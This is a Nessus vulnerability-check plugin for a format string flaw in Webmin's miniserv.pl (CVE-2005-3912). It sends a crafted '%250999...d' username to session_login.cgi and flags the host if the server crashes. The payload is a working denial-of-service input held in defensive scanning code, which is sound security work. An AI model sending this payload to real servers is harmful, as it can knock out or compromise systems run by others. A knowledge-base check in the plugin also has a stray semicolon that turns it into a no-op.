#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20343);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2005-3912");
  script_xref(name:"OSVDB", value:"21222");

  script_name(english:"Webmin miniserv.pl username Parameter Format String");
  script_summary(english:"Checks for username parameter format string vulnerability in Webmin miniserv.pl");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a format string vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Webmin or Usermin, web-based interfaces for
Unix / Linux system administrators and end-users. 

Webmin and Usermin both come with the Perl script 'miniserv.pl' to
provide basic web services, and the version of 'miniserv.pl' installed
on the remote host contains a format string flaw when logging failed
authentication attempts.  Using specially-crafted values for the
'username' parameter of the 'session_login.cgi', an attacker may be
able to exploit this flaw to crash the affected server or potentially
to execute arbitrary code on the affected host under the privileges of
the userid under which 'miniserv.pl' runs, by default root." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ba687296" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/archive/1/418093/100/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.webmin.com/security.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Webmin version 1.250 / Usermin version 1.180 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencies("webmin.nasl");
  script_require_ports("Services/www", 10000);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:10000, embedded: 1);
if (!get_kb_item("www/" + port + "/webmin"));
if (http_is_dead(port:port)) exit(0);

disable_cookiejar();

# Try to exploit the flaw.
exploit = string("%250", crap(data:"9", length:20), "d");
postdata = string(
  "page=/&",
  "user=", exploit, "&",
  "pass=", SCRIPT_NAME
);
r = http_send_recv3(port: port, method: "POST", item: "/session_login.cgi", version: 11, 
 add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded",
 	      		  "Cookie2", 'version="1"',
			  "Cookie", "testing=1" ),
 data: postdata);

# There's a problem if MiniServ appears down.
if (isnull(r)) {
  if (http_is_dead(port:port, retry: 3)) security_hole(port);
}
